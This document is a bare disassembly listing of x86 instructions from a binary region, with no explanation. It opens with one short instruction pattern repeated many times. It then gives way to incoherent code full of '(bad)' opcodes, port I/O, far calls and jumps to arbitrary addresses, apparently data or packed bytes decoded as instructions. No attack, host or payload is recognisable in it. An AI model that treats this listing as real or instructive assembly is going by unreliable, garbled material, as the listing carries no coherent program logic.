  421bbf:	das    
  421bc0:	test   al,0xf7
  421bc2:	test   al,0x77
  421bc4:	xchg   ebp,eax
  421bc5:	lock adc BYTE PTR [ebp-0x40],0x76
  421bca:	hlt    
  421bcb:	push   ss
  421bcc:	das    
  421bcd:	test   al,0xf7
  421bcf:	test   al,0x77
  421bd1:	xchg   ebp,eax
  421bd2:	lock adc BYTE PTR [ebp-0x40],0x76
  421bd7:	hlt    
  421bd8:	push   ss
  421bd9:	das    
  421bda:	test   al,0xf7
  421bdc:	test   al,0x77
  421bde:	xchg   ebp,eax
  421bdf:	lock adc BYTE PTR [ebp-0x40],0x76
  421be4:	hlt    
  421be5:	push   ss
  421be6:	das    
  421be7:	test   al,0xf7
  421be9:	test   al,0x77
  421beb:	xchg   ebp,eax
  421bec:	lock adc BYTE PTR [ebp-0x40],0x76
  421bf1:	hlt    
  421bf2:	push   ss
  421bf3:	das    
  421bf4:	test   al,0xf7
  421bf6:	test   al,0x77
  421bf8:	xchg   ebp,eax
  421bf9:	lock adc BYTE PTR [ebp-0x40],0x76
  421bfe:	hlt    
  421bff:	push   ss
  421c00:	das    
  421c01:	test   al,0xf7
  421c03:	test   al,0x77
  421c05:	xchg   ebp,eax
  421c06:	lock adc BYTE PTR [ebp-0x40],0x76
  421c0b:	hlt    
  421c0c:	push   ss
  421c0d:	das    
  421c0e:	test   al,0xf7
  421c10:	test   al,0x77
  421c12:	xchg   ebp,eax
  421c13:	lock adc BYTE PTR [ebp-0x40],0x76
  421c18:	hlt    
  421c19:	push   ss
  421c1a:	das    
  421c1b:	test   al,0xf7
  421c1d:	test   al,0x77
  421c1f:	xchg   ebp,eax
  421c20:	lock adc BYTE PTR [ebp-0x40],0x76
  421c25:	hlt    
  421c26:	push   ss
  421c27:	das    
  421c28:	test   al,0xf7
  421c2a:	test   al,0x77
  421c2c:	xchg   ebp,eax
  421c2d:	lock in eax,dx
  421c2f:	std    
  421c30:	retf   
  421c31:	jbe    0x421c0e
  421c33:	push   ss
  421c34:	das    
  421c35:	mov    eax,0x375da8f7
  421c3a:	sub    dh,bl
  421c3c:	xor    edi,DWORD PTR [edi]
  421c3e:	pop    ebx
  421c3f:	push   0xffffff91
  421c41:	jg     0x421c88
  421c43:	rol    DWORD PTR [eax+0x64],0x21
  421c47:	gs in  al,0x24
  421c4a:	inc    esp
  421c4b:	sub    al,0xe7
  421c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c4e:	cwde   
  421c4f:	mov    esi,0x14fd4c9a
  421c54:	lods   al,BYTE PTR ss:[esi]
  421c56:	aaa    
  421c57:	push   eax
  421c58:	dec    ecx
  421c59:	int    0x25
  421c5b:	pusha  
  421c5c:	sbb    eax,esp
  421c5e:	mov    dh,BYTE PTR [edi-0x4e]
  421c61:	push   edi
  421c62:	or     al,BYTE PTR [eax]
  421c64:	xchg   ecx,eax
  421c65:	sbb    ebx,DWORD PTR [ebp+0x24]
  421c68:	adc    dh,BYTE PTR [ebp-0x1d]
  421c6b:	sbb    DWORD PTR [edi],edx
  421c6d:	call   0x31a5:0x8ceea62e
  421c74:	cmp    edi,edx
  421c76:	ss std 
  421c78:	inc    edi
  421c79:	adc    esi,DWORD PTR [ebp+0x6aa48d53]
  421c7f:	pop    ebx
  421c80:	mov    cl,0x6e
  421c82:	imul   edi,ecx,0xd3c666b4
  421c88:	fcos   
  421c8a:	enter  0x2c41,0x16
  421c8e:	adc    DWORD PTR [ebx-0x6c3c3bd6],ebx
  421c94:	mov    ah,0x0
  421c96:	jecxz  0x421c76
  421c98:	mov    al,ds:0xc83ae0d0
  421c9d:	add    ebx,edi
  421c9f:	jecxz  0x421c31
  421ca1:	stos   BYTE PTR es:[edi],al
  421ca2:	push   eax
  421ca3:	cdq    
  421ca4:	or     dh,BYTE PTR [edx-0x34]
  421ca7:	mov    dl,0xaa
  421ca9:	push   esp
  421caa:	xor    DWORD PTR [ebp-0x3e5b777a],0x18cfe24e
  421cb4:	push   esi
  421cb5:	dec    eax
  421cb6:	xchg   edx,eax
  421cb7:	test   ebp,edi
  421cb9:	in     eax,dx
  421cba:	mov    bl,0x0
  421cbc:	mov    ecx,0x65a4660d
  421cc1:	adc    BYTE PTR [ecx+0x2eabea07],0xca
  421cc8:	mov    eax,0x91d98802
  421ccd:	outs   dx,BYTE PTR ds:[esi]
  421cce:	inc    edi
  421ccf:	adc    BYTE PTR [eax-0x14df81e],al
  421cd5:	aad    0xbf
  421cd7:	call   0x36c:0x4c9c7679
  421cde:	ds push es
  421ce0:	daa    
  421ce1:	sbb    eax,0x52a8e5a5
  421ce6:	mov    ch,0x1d
  421ce8:	push   es
  421ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cea:	adc    DWORD PTR [edx],edi
  421cec:	xor    al,0x63
  421cee:	mov    ebx,DWORD PTR [esi+ebp*8-0x3de26900]
  421cf5:	xlat   BYTE PTR ds:[ebx]
  421cf6:	stc    
  421cf7:	xor    BYTE PTR [edi+0x26],0x27
  421cfb:	pop    edi
  421cfc:	ret    
  421cfd:	ds pop esi
  421cff:	rcl    edi,0xc
  421d02:	leave  
  421d03:	loopne 0x421d26
  421d05:	out    dx,eax
  421d06:	add    ecx,DWORD PTR [eax]
  421d08:	fs push ds
  421d0a:	pop    ebp
  421d0b:	aas    
  421d0c:	ret    0x7548
  421d0f:	test   eax,0xe5d0d8fe
  421d14:	in     al,0x65
  421d16:	jae    0x421d26
  421d18:	ins    DWORD PTR es:[edi],dx
  421d19:	add    eax,0xfd85fe30
  421d1e:	ds pop esp
  421d20:	sub    ecx,DWORD PTR [ecx+0x57]
  421d23:	imul   DWORD PTR [ebx+ebx*4]
  421d26:	jno    0x421ce5
  421d28:	cmp    al,0x1d
  421d2a:	sub    ch,BYTE PTR [eax+esi*2+0x13249bcc]
  421d31:	pushf  
  421d32:	push   ebp
  421d33:	mov    ds:0xbc72c264,al
  421d38:	xor    ebx,esp
  421d3a:	ds ss ss push ebp
  421d3e:	(bad)  
  421d3f:	dec    esp
  421d40:	bnd jno 0x421d18
  421d43:	mov    dh,BYTE PTR [edx-0x58f4c78b]
  421d49:	imul   esp,DWORD PTR [esi],0xfffffff3
  421d4c:	mov    esi,0xc13bbccc
  421d51:	(bad)  
  421d52:	das    
  421d53:	jl     0x421d4b
  421d55:	shr    DWORD PTR [edx+eax*2],0x1
  421d59:	adc    eax,0x300c455a
  421d5e:	xlat   BYTE PTR ds:[ebx]
  421d5f:	push   ds
  421d60:	push   ebx
  421d61:	jge    0x421dd1
  421d63:	repnz aam 0x81
  421d66:	gs jnp 0x421d83
  421d69:	xor    DWORD PTR ds:0xe609d6a7,eax
  421d6f:	data16 jb 0x421da1
  421d72:	add    al,0xf7
  421d74:	sbb    ecx,DWORD PTR [edx+eax*2]
  421d77:	and    DWORD PTR [ecx-0x1],eax
  421d7a:	(bad)  
  421d7b:	add    esp,esp
  421d7d:	frstor [esp+edi*2+0x59f8a7eb]
  421d84:	mov    DWORD PTR [ecx-0x6726594c],esi
  421d8a:	(bad)  
  421d8c:	sub    eax,0x3a04419d
  421d91:	shl    bl,1
  421d93:	hlt    
  421d94:	sar    al,0xf7
  421d97:	in     eax,0xd2
  421d99:	jmp    0xfb081e18
  421d9e:	aaa    
  421d9f:	aas    
  421da0:	jmp    0x145b9e6a
  421da5:	sub    ch,BYTE PTR [eax+ebp*1-0x2d]
  421da9:	add    al,0x3b
  421dab:	mov    edi,0x33095928
  421db0:	(bad)  
  421db1:	and    dh,BYTE PTR [ecx-0x31872959]
  421db7:	call   DWORD PTR [ebx+ecx*4+0x73]
  421dbb:	add    ah,BYTE PTR [esi]
  421dbd:	mov    eax,ds:0x3d83bb71
  421dc2:	stos   DWORD PTR es:[edi],eax
  421dc3:	mov    al,0x3e
  421dc5:	mov    esp,DWORD PTR [eax+0x1fa3e6be]
  421dcb:	jg     0x421db2
  421dcd:	add    BYTE PTR [ebp+0x13],0xc4
  421dd1:	push   esp
  421dd2:	lea    edi,[ebp-0x7d1134f3]
  421dd8:	dec    edx
  421dd9:	jp     0x421df1
  421ddb:	cld    
  421ddc:	in     al,dx
  421ddd:	test   eax,0x4953fff4
  421de2:	fnstenv [ecx+0x3a]
  421de5:	mov    ah,bh
  421de7:	push   ecx
  421de8:	clc    
  421de9:	mov    ecx,0x6bbf5416
  421dee:	mov    ebp,0x79ede8c9
  421df3:	imul   edi,ebp,0x744acb2a
  421df9:	mov    cl,0x86
  421dfb:	push   edi
  421dfc:	test   al,0xa2
  421dfe:	shl    eax,0x51
  421e01:	mov    es:0xf3fb1bcb,eax
  421e07:	xor    ch,0x1f
  421e0a:	loope  0x421e04
  421e0c:	in     al,dx
  421e0d:	sub    ah,BYTE PTR [esi]
  421e0f:	pop    ds
  421e10:	push   ecx
  421e11:	scas   al,BYTE PTR es:[edi]
  421e12:	push   ds
  421e13:	dec    esi
  421e14:	jl     0x421ddd
  421e16:	repnz mov esi,DWORD PTR [eax+0x2d]
  421e1a:	rol    BYTE PTR ds:0x4593ca03,1
  421e20:	or     eax,0x7be484a7
  421e25:	jge    0x421ddf
  421e27:	out    0x32,al
  421e29:	sti    
  421e2a:	jge    0x421e4e
  421e2c:	jnp    0x421e47
  421e2e:	mov    esp,DWORD PTR [ebx+0x5d32666]
  421e34:	sbb    eax,0x3b990a88
  421e39:	dec    edi
  421e3a:	cmp    eax,0x9dabca96
  421e3f:	pop    esp
  421e40:	cmp    ebx,DWORD PTR [eax-0x11]
  421e43:	mov    cl,0x93
  421e45:	stc    
  421e46:	outs   dx,DWORD PTR ds:[esi]
  421e47:	pop    esi
  421e48:	or     ch,ah
  421e4a:	cs cmp eax,0xdc9ecb27
  421e50:	nop
  421e51:	inc    esp
  421e52:	outs   dx,DWORD PTR ds:[esi]
  421e53:	cmp    BYTE PTR [ecx+0x2afc018e],dh
  421e59:	in     eax,0x43
  421e5b:	out    0xee,al
  421e5d:	arpl   WORD PTR [esi],dx
  421e5f:	int3   
  421e60:	sub    eax,0x8a990a14
  421e65:	rcl    BYTE PTR [eax+0x3cb11a69],1
  421e6b:	ss mov ah,0x6b
  421e6e:	jge    0x421e92
  421e70:	stc    
  421e71:	aas    
  421e72:	sub    bh,dh
  421e74:	xchg   DWORD PTR fs:[esi-0x4deeb7ac],esi
  421e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e7c:	dec    DWORD PTR [esi+0x78aecfed]
  421e82:	out    dx,al
  421e83:	pop    ebx
  421e84:	ret    0xb473
  421e87:	scas   eax,DWORD PTR es:[edi]
  421e88:	lods   al,BYTE PTR ds:[esi]
  421e89:	mov    ch,0x34
  421e8b:	jmp    0x13af:0x99abfef6
  421e92:	gs push 0x13
  421e95:	jmp    0x9928ac5
  421e9a:	mov    ds:0xbd938e41,eax
  421e9f:	mov    dl,0x39
  421ea1:	aad    0x0
  421ea3:	imul   edi,DWORD PTR [edx],0x70f809d1
  421ea9:	or     eax,0x1bfaca3f
  421eae:	pushf  
  421eaf:	cwde   
  421eb0:	push   0xffffffd3
  421eb2:	adc    al,0xb7
  421eb4:	cmp    DWORD PTR [ebx+0x4138fbaf],esp
  421eba:	bound  ecx,QWORD PTR ds:0xdc9b7038
  421ec0:	sbb    eax,0x20de0838
  421ec5:	enter  0x782d,0xf2
  421ec9:	pop    es
  421eca:	cli    
  421ecb:	inc    ebp
  421ecc:	mov    bh,0x70
  421ece:	in     al,0xf1
  421ed0:	(bad)  
  421ed2:	gs add al,0x6d
  421ed5:	jle    0x421f39
  421ed7:	push   ss
  421ed8:	xchg   edx,eax
  421ed9:	xor    DWORD PTR [ebp-0x21],ebx
  421edc:	std    
  421edd:	(bad)  
  421ede:	js     0x421e60
  421ee0:	pop    esp
  421ee1:	sbb    DWORD PTR [esi-0x14242122],0xc12413be
  421eeb:	pop    esp
  421eec:	mov    dl,0xfe
  421eee:	fild   DWORD PTR [esi]
  421ef0:	adc    DWORD PTR [ecx],eax
  421ef2:	push   esi
  421ef3:	int    0x39
  421ef5:	and    eax,0x4cbd831a
  421efa:	shr    BYTE PTR [ebx],cl
  421efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421efd:	lods   al,BYTE PTR ds:[esi]
  421efe:	add    eax,0xb9f5cc78
  421f03:	iret   
  421f04:	out    dx,al
  421f05:	jno    0x421f10
  421f07:	icebp  
  421f08:	cmp    ah,BYTE PTR [ecx-0x2c]
  421f0b:	mov    edx,gs
  421f0d:	sub    BYTE PTR [edi],0x2c
  421f10:	or     eax,0xfae2e762
  421f15:	ret    
  421f16:	in     eax,0xa4
  421f18:	jae    0x421f56
  421f1a:	scas   eax,DWORD PTR es:[edi]
  421f1b:	pop    ds
  421f1c:	push   edi
  421f1d:	xchg   ebx,eax
  421f1e:	dec    edi
  421f1f:	idiv   esp
  421f21:	mul    DWORD PTR [esi-0x6f9d7e9c]
  421f27:	not    BYTE PTR [ebx]
  421f29:	push   ebp
  421f2b:	or     eax,0x6163591a
  421f30:	sahf   
  421f31:	sbb    al,0x8
  421f33:	inc    edi
  421f34:	sub    dl,ch
  421f36:	mov    bh,0x0
  421f38:	neg    BYTE PTR [eax]
  421f3a:	mov    dh,BYTE PTR [edx+0x50]
  421f3d:	sub    BYTE PTR [edx],0xa7
  421f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f41:	aam    0x74
  421f43:	jmp    0x421f9a
  421f45:	mov    esp,0xf65b362b
  421f4a:	ins    BYTE PTR es:[edi],dx
  421f4b:	jle    0x421f4d
  421f4d:	cmp    bh,BYTE PTR [edx+0x565f2d31]
  421f53:	sbb    bh,BYTE PTR ds:[edx-0x50da45c]
  421f5a:	dec    edx
  421f5b:	pop    eax
  421f5c:	mov    BYTE PTR [eax],ah
  421f5e:	stos   BYTE PTR es:[edi],al
  421f5f:	(bad)  
  421f60:	pop    ebx
  421f61:	in     eax,0x6d
  421f63:	or     bl,BYTE PTR [eax]
  421f65:	fxch   st(2)
  421f67:	or     DWORD PTR [esi+0x830743e],esp
  421f6d:	ja     0x421f2f
  421f6f:	mov    DWORD PTR ds:0xcf41b23a,ebx
  421f75:	cmp    BYTE PTR ds:0xfe288069,dh
  421f7b:	cmp    dl,BYTE PTR [ecx]
  421f7d:	fld    DWORD PTR [ebx+ebp*1-0x25986b76]
  421f84:	syscall 
  421f86:	aad    0x6c
  421f88:	stos   BYTE PTR es:[edi],al
  421f89:	sub    ah,0xf8
  421f8c:	nop
  421f8d:	jmp    0x349f:0x6eef5782
  421f94:	clc    
  421f95:	(bad)  
  421f96:	jecxz  0x421fca
  421f98:	js     0x421f28
  421f9a:	push   ds
  421f9b:	hlt    
  421f9c:	push   ds
  421f9d:	jle    0x421fb4
  421f9f:	sahf   
  421fa0:	and    esi,edi
  421fa2:	xor    al,BYTE PTR [ecx]
  421fa4:	mov    ch,BYTE PTR [esi]
  421fa6:	mov    edi,esp
  421fa8:	pop    eax
  421fa9:	mov    ds:0xa34919d8,eax
  421fae:	and    DWORD PTR [ecx+0x58],ecx
  421fb1:	pushf  
  421fb2:	es jbe 0x421fb0
  421fb5:	lock adc edi,DWORD PTR [edx+0x17f9d44c]
  421fbc:	or     edx,eax
  421fbe:	dec    ebp
  421fbf:	pusha  
  421fc0:	add    eax,0xbdbbafc6
  421fc5:	repnz stos BYTE PTR es:[edi],al
  421fc7:	xchg   ebx,eax
  421fc8:	mov    ds:0x292308e3,al
  421fcd:	push   ebp
  421fce:	add    cl,0x41
  421fd1:	mov    dl,BYTE PTR [ebx]
  421fd3:	cmp    ah,bl
  421fd5:	arpl   WORD PTR [eax],cx
  421fd7:	cmp    BYTE PTR [eax+0x4d],ah
  421fda:	call   0xe444:0x947339fd
  421fe1:	jecxz  0x421ff8
  421fe3:	pop    edx
  421fe4:	test   BYTE PTR [ebx],dl
  421fe6:	addr16 xchg eax,esp
  421fe9:	xlat   BYTE PTR ds:[ebx]
  421fea:	mov    ebx,0xcda22224
  421fef:	jp     0x421fcb
  421ff1:	pop    ebp
  421ff2:	jp     0x422005
  421ff4:	or     al,0x42
  421ff6:	aad    0x13
  421ff8:	dec    ebp
  421ff9:	pop    ecx
  421ffa:	push   ebx
  421ffb:	retf   
  421ffc:	jns    0x421ff4
  421ffe:	shl    esi,0x76
  422001:	jmp    0xe2a17df4
  422006:	jb     0x421fa9
  422008:	pop    esi
  422009:	mov    cl,0xac
  42200b:	cmc    
  42200c:	cs shr edx,1
  42200f:	loop   0x422075
  422011:	xchg   esi,eax
  422012:	rcl    BYTE PTR [edx-0x6e62bbe2],1
  422018:	out    0x19,al
  42201a:	iret   
  42201b:	mov    cx,0x39a7
  42201f:	sbb    BYTE PTR [edx+0xe],dl
  422022:	inc    ebx
  422023:	xchg   BYTE PTR [eax-0x2257dcdc],cl
  422029:	mov    DWORD PTR [edi],esi
  42202b:	aaa    
  42202c:	xor    bh,ch
  42202e:	ins    DWORD PTR es:[edi],dx
  42202f:	sub    cl,0xa5
  422032:	or     cl,BYTE PTR [esi]
  422034:	or     ah,al
  422036:	sub    al,0x76
  422038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422039:	jns    0x42202b
  42203b:	and    BYTE PTR [ecx+esi*1-0x66e9d818],cl
  422042:	or     DWORD PTR [ebp+0x531db1b4],esp
  422048:	xor    dl,al
  42204a:	(bad)  
  42204b:	out    0xf3,al
  42204d:	xor    al,0x70
  42204f:	outs   dx,BYTE PTR ds:[esi]
  422050:	enter  0x57ee,0xa2
  422054:	jb     0x4220b8
  422056:	mov    al,0x94
  422058:	sbb    DWORD PTR [ebx],edi
  42205a:	dec    ebp
  42205b:	arpl   WORD PTR ds:0xc1bdf7c6,bx
  422061:	pop    ebp
  422062:	push   ds
  422063:	js     0x421ff8
  422065:	sub    BYTE PTR [esi],cl
  422067:	dec    ebp
  422068:	fistp  DWORD PTR [ebp+0x2d]
  42206b:	mov    al,0x98
  42206d:	sub    bh,BYTE PTR fs:[ecx]
  422070:	pushf  
  422071:	data16 sbb al,0x61
  422074:	js     0x4220e7
  422076:	out    dx,al
  422077:	dec    ebp
  422078:	sub    esi,DWORD PTR [edi+0x252d4a5f]
  42207e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42207f:	call   0xe2c1dac5
  422084:	cwde   
  422085:	ret    
  422086:	fs (bad) 
  422088:	daa    
  422089:	dec    ebp
  42208a:	inc    edx
  42208b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42208c:	cwde   
  42208d:	pxor   mm3,QWORD PTR [edx+0x7]
  422091:	xchg   edi,eax
  422092:	jmp    0xdcc87ee8
  422097:	push   es
  422098:	sub    al,0x15
  42209a:	pop    edi
  42209b:	stos   DWORD PTR es:[edi],eax
  42209c:	mov    eax,ds:0x747e89e
  4220a1:	in     al,dx
  4220a2:	stos   DWORD PTR es:[edi],eax
  4220a3:	and    eax,DWORD PTR [edi]
  4220a5:	jecxz  0x422085
  4220a7:	cmp    esi,ebp
  4220a9:	into   
  4220aa:	cmp    DWORD PTR [ebp+0x7c],ebx
  4220ad:	mov    esp,0x2e345d70
  4220b2:	push   ds
  4220b3:	sub    al,0x84
  4220b5:	dec    ebx
  4220b6:	dec    edi
  4220b7:	test   BYTE PTR ds:0xd828b5c6,ch
  4220bd:	fcom   QWORD PTR [esi-0x3b]
  4220c0:	pop    eax
  4220c1:	repnz mov cl,0x30
  4220c4:	out    0x89,al
  4220c6:	in     eax,dx
  4220c7:	int    0x94
  4220c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ca:	cli    
  4220cb:	xor    eax,0xdd816654
  4220d0:	lea    eax,[esi+esi*4-0x779102af]
  4220d7:	in     al,0x9a
  4220d9:	sbb    al,0x78
  4220db:	sub    ah,BYTE PTR [esi]
  4220dd:	mov    eax,0x19036313
  4220e2:	cld    
  4220e3:	inc    esp
  4220e4:	add    DWORD PTR [ecx-0x24],edi
  4220e7:	xchg   esi,eax
  4220e8:	sbb    ah,BYTE PTR [ecx+ecx*2+0x6b]
  4220ec:	loopne 0x42213c
  4220ee:	aam    0xfe
  4220f0:	inc    edi
  4220f1:	iret   
  4220f2:	stos   BYTE PTR es:[edi],al
  4220f3:	ds push es
  4220f5:	xor    ebx,ebp
  4220f7:	dec    edi
  4220f8:	and    BYTE PTR ds:0x96677537,dl
  4220fe:	sahf   
  4220ff:	xchg   BYTE PTR [ecx-0x4a],dl
  422102:	fdiv   DWORD PTR [esi+0x26b5e244]
  422108:	clc    
  422109:	call   0x4f2f:0x5c3355bd
  422110:	dec    BYTE PTR [esi+0x7cd59564]
  422116:	or     ecx,ebx
  422118:	ret    0xeb90
  42211b:	push   cs
  42211c:	pop    ebp
  42211d:	jb     0x422161
  42211f:	std    
  422120:	pop    dx
  422122:	out    dx,al
  422123:	mov    eax,ds:0xd1958e5f
  422128:	or     ah,al
  42212a:	test   eax,0x83f4d9a7
  42212f:	in     eax,0x46
  422131:	scas   al,BYTE PTR es:[edi]
  422132:	push   ebp
  422133:	jno    0x4221b2
  422135:	inc    edi
  422136:	sbb    dh,al
  422138:	inc    esi
  422139:	jmp    0x936e9d9d
  42213e:	mov    ebp,0x27e50c81
  422143:	popa   
  422144:	inc    eax
  422145:	sub    ebx,edi
  422147:	mov    ch,0x97
  422149:	pop    esi
  42214a:	cli    
  42214b:	inc    edx
  42214c:	sub    BYTE PTR [edx-0x1c],dl
  42214f:	dec    ebx
  422150:	add    ebx,DWORD PTR [edx]
  422152:	dec    ebp
  422153:	pop    ecx
  422154:	xchg   DWORD PTR [edx-0x15],esp
  422157:	hlt    
  422158:	test   DWORD PTR [edx+0x54],edi
  42215b:	inc    edi
  42215c:	sub    ebp,DWORD PTR [edi+eiz*1+0x5d5bf8e7]
  422163:	in     eax,0xff
  422165:	mov    eax,ds:0xc4544f5
  42216a:	in     eax,0xc1
  42216c:	jne    0x42212c
  42216e:	imul   esi,DWORD PTR [eax],0xffffffd7
  422171:	inc    edx
  422172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422173:	sub    ah,BYTE PTR [edx+0xd]
  422176:	jl     0x422162
  422178:	or     al,0x5e
  42217a:	xor    DWORD PTR [ebp+eax*2+0x3e],esi
  42217e:	and    al,0xfd
  422180:	iret   
  422181:	add    DWORD PTR [ebp-0x394c1ad3],esi
  422187:	cdq    
  422188:	daa    
  422189:	fst    DWORD PTR ds:0xf0ad1392
  42218f:	add    eax,0x172ba4b5
  422194:	or     ecx,esp
  422196:	pop    edi
  422197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422198:	inc    esp
  422199:	ror    ah,1
  42219b:	add    cl,cl
  42219d:	stc    
  42219e:	inc    edi
  42219f:	adc    DWORD PTR [eax],0xffffffc7
  4221a2:	retf   
  4221a3:	or     eax,0x1fc3f8b3
  4221a8:	jno    0x4221ca
  4221aa:	out    0xc9,al
  4221ac:	lods   eax,DWORD PTR ds:[esi]
  4221ad:	xor    al,dh
  4221af:	push   ds
  4221b0:	add    cl,BYTE PTR [esi+0x2e]
  4221b3:	sub    esp,ebx
  4221b5:	xchg   BYTE PTR [eax+0x52],dl
  4221b8:	sbb    al,0xd5
  4221ba:	into   
  4221bb:	pcmpeqd mm4,QWORD PTR [ebx]
  4221be:	inc    ebp
  4221bf:	adc    al,0xad
  4221c1:	fucompp 
  4221c3:	fsubr  QWORD PTR [edx+eiz*8-0x2a1d05e2]
  4221ca:	stc    
  4221cb:	cs jl  0x4221e3
  4221ce:	sub    ebp,DWORD PTR [ecx+0x4]
  4221d1:	nop
  4221d2:	outs   dx,DWORD PTR ds:[esi]
  4221d3:	and    BYTE PTR [ecx],dl
  4221d5:	xchg   ebp,eax
  4221d6:	lock ds mov ah,0x8d
  4221da:	sbb    bh,dh
  4221dc:	push   ss
  4221dd:	lods   al,BYTE PTR ds:[esi]
  4221de:	sbb    al,0x28
  4221e0:	mov    esp,DWORD PTR [esp+esi*8-0x4765ae37]
  4221e7:	rol    DWORD PTR [edi+0x411d5c3d],1
  4221ed:	mov    ecx,0xeaf6e38d
  4221f2:	pop    ebx
  4221f3:	aaa    
  4221f4:	fisttp DWORD PTR [edi+0x53cbb3a4]
  4221fa:	ret    0xff09
  4221fd:	aaa    
  4221fe:	icebp  
  4221ff:	into   
  422200:	push   ecx
  422201:	dec    esi
  422202:	sub    ecx,DWORD PTR [ebx]
  422204:	inc    eax
  422205:	xchg   ebp,eax
  422206:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422208:	mov    ecx,0x3db84bdb
  42220d:	xor    al,0xc
  42220f:	mov    WORD PTR [eax-0x1d],ss
  422212:	push   0x3e8fdcc0
  422217:	lea    ebx,[edi+0x2fdbec4]
  42221d:	stc    
  42221e:	data16 add BYTE PTR [esi+0x6f5886b9],0x10
  422226:	sbb    ecx,DWORD PTR [eax+0x11]
  422229:	add    ebx,DWORD PTR [ebx-0x33]
  42222c:	daa    
  42222d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42222e:	push   ecx
  42222f:	inc    esp
  422230:	or     al,0xe2
  422232:	adc    ah,BYTE PTR [esi+0x7f]
  422235:	mov    esi,0x2fae7821
  42223a:	xor    DWORD PTR [edi+eax*1],eax
  42223d:	aas    
  42223e:	push   0x28
  422240:	stos   BYTE PTR es:[edi],al
  422241:	pop    ebx
  422242:	xchg   esi,ebx
  422244:	jle    0x4222c5
  422246:	mov    al,ds:0xa5346659
  42224b:	adc    DWORD PTR [edx-0xcac20e8],esp
  422251:	outs   dx,BYTE PTR cs:[esi]
  422253:	test   DWORD PTR [edi-0x683529e3],ebp
  422259:	repnz mov ebp,0x659fd578
  42225f:	fdivr  QWORD PTR [edi+0x79]
  422262:	popf   
  422263:	dec    ecx
  422264:	test   bh,bh
  422266:	mov    esi,DWORD PTR [edx-0x5ad1b39d]
  42226c:	sbb    eax,0x2182a6b4
  422271:	push   edx
  422272:	ins    BYTE PTR es:[edi],dx
  422273:	sbb    al,0xb5
  422275:	scas   eax,DWORD PTR es:[edi]
  422276:	jne    0x42227d
  422278:	sub    eax,0x69352a31
  42227d:	cmp    al,BYTE PTR [esi-0x6970709b]
  422283:	mov    edx,0x2669113c
  422288:	pusha  
  422289:	pop    eax
  42228a:	cmp    al,0xff
  42228c:	xor    eax,0x5441b76f
  422291:	and    esi,DWORD PTR [edx]
  422293:	add    eax,0x6e4ea0de
  422298:	or     eax,0x7da19dff
  42229d:	inc    eax
  42229e:	mov    ds:0x93d90739,eax
  4222a3:	pop    eax
  4222a4:	inc    ebx
  4222a5:	xchg   ebp,eax
  4222a6:	xor    edx,DWORD PTR es:[esi-0x49b95ec1]
  4222ad:	int    0xd7
  4222af:	mov    eax,0x34a00691
  4222b4:	repnz or eax,ecx
  4222b7:	lods   al,BYTE PTR ds:[esi]
  4222b8:	mov    ecx,0xe861497
  4222bd:	ja     0x4222d0
  4222bf:	mov    bl,0xce
  4222c1:	mov    bh,dh
  4222c3:	mov    edi,0x17808956
  4222c8:	lss    esp,FWORD PTR [eax]
  4222cb:	enter  0x3a6f,0x7c
  4222cf:	mov    DWORD PTR [ebp+esi*2-0x5],edi
  4222d3:	rol    DWORD PTR [eax-0x7f17308a],1
  4222d9:	nop
  4222da:	fisttp QWORD PTR [eax+ebp*1-0x64]
  4222de:	popa   
  4222df:	sub    eax,0x9a93fe4a
  4222e4:	pop    ebx
  4222e5:	lea    ebx,[edx-0x54]
  4222e8:	pop    esi
  4222e9:	test   BYTE PTR ds:0x7443983c,0x4
  4222f0:	adc    esp,ebx
  4222f2:	and    bl,dh
  4222f4:	out    0xa7,al
  4222f6:	ja     0x422366
  4222f8:	lods   eax,DWORD PTR ds:[esi]
  4222f9:	jp     0x4222a5
  4222fb:	pop    esi
  4222fc:	sbb    eax,0x5c2ec6a3
  422301:	push   ebx
  422302:	add    bh,BYTE PTR [ebx-0x7c8ae837]
  422308:	aad    0xfc
  42230a:	push   ds
  42230b:	sbb    al,0xf7
  42230d:	js     0x42233d
  42230f:	sub    ebx,DWORD PTR [eax+ebp*2+0x2029e062]
  422316:	pushf  
  422317:	sbb    eax,DWORD PTR [esi]
  422319:	jl     0x422315
  42231b:	sub    al,0x5
  42231d:	cmp    ah,bl
  42231f:	cmp    ebp,DWORD PTR [eax]
  422321:	fs loope 0x4222dd
  422324:	mov    eax,ds:0x4f681007
  422329:	jl     0x42236a
  42232b:	fisub  DWORD PTR [ecx]
  42232d:	out    0x5a,al
  42232f:	jmp    0x42234e
  422331:	in     al,0x63
  422333:	(bad)  
  422334:	loopne 0x4222d7
  422336:	xchg   dl,al
  422338:	mov    esp,0xaaf310dc
  42233d:	xchg   ebp,eax
  42233e:	dec    ebp
  42233f:	sub    al,BYTE PTR [edi+edx*8+0x4]
  422343:	mov    edi,0x8e957e8a
  422348:	das    
  422349:	outs   dx,DWORD PTR ds:[esi]
  42234a:	dec    ecx
  42234b:	push   esi
  42234c:	sub    BYTE PTR [eax],bl
  42234e:	or     edx,DWORD PTR [ebx]
  422350:	sbb    dl,BYTE PTR [esi-0x3a166f0f]
  422356:	call   0xbe44eb45
  42235b:	mov    ah,0x33
  42235d:	pop    esi
  42235e:	push   edx
  42235f:	xchg   ebx,eax
  422360:	std    
  422361:	dec    esi
  422362:	sbb    eax,0x4d5bbd34
  422367:	jb     0x4223b3
  422369:	dec    edi
  42236a:	cmp    al,0x7c
  42236c:	xchg   esp,eax
  42236d:	pop    ecx
  42236e:	xchg   ebp,eax
  42236f:	stc    
  422370:	adc    cl,BYTE PTR [edi+edi*1+0x2f]
  422374:	cmp    eax,0x2a13ad28
  422379:	stos   DWORD PTR es:[edi],eax
  42237a:	add    eax,0xdf8e3c1e
  42237f:	out    dx,eax
